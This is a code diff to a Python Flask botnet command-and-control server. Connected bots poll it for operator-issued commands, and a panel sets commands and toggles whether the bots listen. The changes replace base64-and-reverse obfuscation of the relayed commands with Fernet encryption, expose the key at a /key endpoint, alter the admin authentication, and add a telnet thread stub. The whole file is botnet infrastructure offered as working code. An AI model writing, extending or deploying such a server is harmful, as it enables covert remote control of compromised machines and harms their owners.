@@ -1,12 +1,15 @@
 # imports
-import subprocess, flask
+import subprocess, flask, threading
 from flask import request, jsonify
 from os import system, name
-import logging, base64, time, string, random
+from cryptography.fernet import Fernet
+import logging, base64, time, string, random, urllib.parse
+import pyperclip as pc
 
 #  define server settings and setting admin password
 host = "0.0.0.0"
 port = 80
+fernetkey = Fernet.generate_key()
 global adminpass
 adminpass = str("".join(
   random.choices(string.ascii_lowercase + string.digits, k=7)))
@@ -46,61 +49,28 @@ def datetime():
   return f"[{month}/{day}/{year}][{hour}:{minute}:{seconds}]"
 
 
-# encode input with base64
-def b64_encode(input):
-  input_ascii = input.encode("ascii")
-  input_b64_raw = base64.b64encode(input_ascii)
-  input_b64 = input_b64_raw.decode("ascii")
-  return input_b64
+def encode(data, key):
+  f = Fernet(key)
+  token = f.encrypt(data.encode("utf-8"))
+  return (token.decode("utf-8"))
 
 
-# decode base64 input
-def b64_decode(string):
-  string_ascii = string.encode("ascii")
-  string_decoded_raw = base64.b64decode(string_ascii)
-  string_decoded = string_decoded_raw.decode("ascii")
-  return string_decoded
-
-
-# reverse input
-def reverse(input):
-  return input[::-1]
-
-  
-# full encode
-def encode(string):
-  step1 = b64_encode(string)
-  step2 = reverse(step1)
-  output = b64_encode(step2)
-  return output
-
-
-# full decode
-def decode(string):
-  step4 = b64_decode(string)
-  step5 = reverse(step4)
-  output = b64_decode(step5)
-  return output
-
-
-# clear the command file
-def clearcommand():
-  with open("txt/command.txt", "r+") as file:
-    file.truncate(0)
+def decode(data, key):
+  f = Fernet(key)
+  return ((f.decrypt(data)).decode("utf-8"))
 
 
 # get the contents of the command file
 def getcommand():
   with open("txt/command.txt", "r+") as commandfile:
-    command = commandfile.read()
+    command = commandfile.readlines()[-1]
     return command
 
 
 # set the content of the command file
 def setcommand(command):
-  with open("txt/command.txt", "r+") as commandfile:
-    commandfile.truncate(0)
-    commandfile.writelines(encode(command))
+  with open("txt/command.txt", "a") as commandfile:
+    commandfile.writelines(f"\n{command}")
     commandfile.close()
     return command
 
@@ -110,16 +80,14 @@ def bottoggle():
   global x
   x = not x
   if x == True:
-    with open("txt/bottoggle.txt", "r+") as bottogglefile:
-      bottogglefile.truncate(0)
-      bottogglefile.writelines(encode(str("listen")))
+    with open("txt/bottoggle.txt", "a") as bottogglefile:
+      bottogglefile.writelines("\nlisten")
       bottogglefile.close()
       print("cnc > bots set to Listen")
       return "listen"
   else:
-    with open("txt/bottoggle.txt", "r+") as bottogglefile:
-      bottogglefile.truncate(0)
-      bottogglefile.writelines(encode(str("off")))
+    with open("txt/bottoggle.txt", "a") as bottogglefile:
+      bottogglefile.writelines("\noff")
       bottogglefile.close()
       print("cnc > bots set to Off")
       return "off"
@@ -129,6 +97,11 @@ def bottoggle():
 app = flask.Flask(__name__)
 x = True
 bots = 0
+
+
+# Telnet thread
+def telnetthread():
+  pass
 
 
 # the main page
@@ -151,18 +124,25 @@ def api_login():
 @app.route("/check", methods=["GET"])
 def api_check():
   with open("txt/bottoggle.txt", "r+") as bottogglefile:
-    istoggled = bottogglefile.read()
-    return istoggled
+    istoggled = bottogglefile.readlines()[-1]
+    return encode(istoggled, fernetkey)
+
+
+@app.route("/new", methods=["GET"])
+def api_new():
+  adminpass = str("".join(
+    random.choices(string.ascii_lowercase + string.digits, k=7)))
+  with open("html/new.html", "r") as f:
+    html = f.read()
+  return (html.replace("{adminpass}", adminpass)).replace(
+    "{adminpassencrypted}",
+    str((base64.b64encode(adminpass.encode("utf-8")))).replace("=", ""))
 
 
 # where the bot gets controlled
 @app.route("/bot", methods=["GET"])
 def api_bot():
-  if "check" in request.args:
-    with open("txt/bottoggle.txt", "r+") as bottogglefile:
-      istoggled = bottogglefile.read()
-      return istoggled
-  elif "toggle" in request.args:
+  if "toggle" in request.args:
     return bottoggle()
   elif "connect" in request.args:
     print(f"cnc > bot connected! > {request.args['connect']}")
@@ -173,7 +153,7 @@ def api_bot():
       return contents
   else:
     command = getcommand()
-    return command
+    return encode(command, fernetkey)
 
 
 # the main cnc access
@@ -182,8 +162,8 @@ def api_cnc():
   if "command" in request.args:
     command = request.args["command"]
     setcommand(command)
-    print(f"cnc > set command > {command} > {encode(command)}")
-    return f"set command : {command} > {encode(command)}\n"
+    print(f"cnc > set command > {command} > {encode(command, fernetkey)}")
+    return f"set command : {command} > {encode(command, fernetkey)}\n"
   elif "help" in request.args:
     return """
   ├── Spaces = %%
@@ -208,7 +188,8 @@ def admin():
     global adminpass
     if request.args["passwordcheck"] == adminpass:
       print("cnc > Admin authenticated")
-      return "good"
+      return str(
+        (base64.b64encode(adminpass.encode("utf-8")))).replace("=", "")
     else:
       print("cnc > Admin authentication failed")
       return "bad"
@@ -218,19 +199,26 @@ def admin():
     return errorpage
 
 
+@app.route("/key", methods=["GET"])
+def key():
+  return fernetkey
+
+
 # the main panel
 @app.route("/panel", methods=["GET"])
 def panel():
-  if "password" in request.args:
+  if "auth" in request.args:
     global adminpass
-    if request.args["password"] == adminpass:
+    if request.args["auth"] == str(
+      (base64.b64encode(adminpass.encode("utf-8")))).replace("=", ""):
       with open("html/panel.html", "r") as f:
         panel_page = f.read()
-      print("cnc > Admin Logged into panel")
       adminpass = str("".join(
         random.choices(string.ascii_lowercase + string.digits, k=7)))
       clear()
       print(banner())
+      print("cnc > Admin Authenticated")
+      print("cnc > Admin Logged into panel")
       print(f"cnc > Admin password changed > {adminpass}")
       return panel_page
     else:
@@ -256,9 +244,13 @@ def banner():
   return f"""
   Flask Cnc Server
   ├── Started at {datetime()}
-  ├── Admin Password : {adminpass}
   ├── Host           : {host}
-  └── Port           : {port}
+  │   └── Port       : {port}
+  ├── Fernet Key     : {fernetkey}
+  │   └── Test encryption
+  │       ├── {encode("Hello, World!", fernetkey)}
+  │       └── {decode((encode("Hello, World!", fernetkey)), fernetkey)}
+  └── Admin Password : {adminpass}
 """
 
 
@@ -269,5 +261,6 @@ log.disabled = True
 clear()
 # print the banner
 print(banner())
-# start the server
+# start the server and telnet thread
+# threading.Thread(target=telnetthread).start()
 app.run(host=host, port=port, debug=True)
